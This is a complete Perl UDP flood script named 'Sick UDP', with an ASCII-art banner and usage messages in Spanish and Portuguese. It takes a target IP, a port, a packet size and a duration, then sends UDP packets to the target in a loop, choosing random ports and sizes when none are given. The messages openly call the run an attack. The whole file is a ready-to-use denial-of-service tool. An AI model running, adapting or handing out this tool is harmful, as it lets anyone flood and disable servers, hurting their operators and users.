﻿#!/usr/bin/perl
 
##############
# Sick UDP
##############
 
use Socket;
use strict;
use Term::ANSIColor qw(:constants);
 
print PURPLE, '                  
                                                                                                    
 ad88888ba   88              88             88888888ba,    88888888ba,                  ad88888ba   
d8"     "8b  ""              88             88      `"8b   88      `"8b                d8"     "8b  
Y8,                          88             88        `8b  88        `8b               Y8,          
`Y8aaaaa,    88   ,adPPYba,  88   ,d8       88         88  88         88   ,adPPYba,   `Y8aaaaa,    
  `"""""8b,  88  a8"     ""  88 ,a8"        88         88  88         88  a8"     "8a    `"""""8b,  
        `8b  88  8b          8888[          88         8P  88         8P  8b       d8          `8b  
Y8a     a8P  88  "8a,   ,aa  88`"Yba,       88      .a8P   88      .a8P   "8a,   ,a8"  Y8a     a8P  
 "Y88888P"   88   `"Ybbd8"'  88   `Y8a      88888888Y"'    88888888Y"'     `"YbbdP"'    "Y88888P"   
 
', RESET;
print "\n";
 
if ($#ARGV != 3) {
  print BLUE, "sick.pl <ip> <puerto> <poder> <paquetes>\n", RESET;
  print BLUE, " puerto=0: el puerto del servidor\n", RESET;
  print BLUE, " paquetes=0: cantidad de paquetes a enviar\n", RESET;
  print BLUE, " tiempo=0: segundos especificos-infinito con un cero\n", RESET;
  print RED, "Quieres parar el ATAQUE mi amor?! Usa Ctrl-C\n", RESET;
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Não pode resolver o nome do host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Atacando $ip " . ($port ? $port : "random") . " porta " .
  ($size ? "$size-bytes" : "random size") . " pacotes" .
  ($time ? " por $time segundos. " : "") . "\n";
print "Para el Ataque usando Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}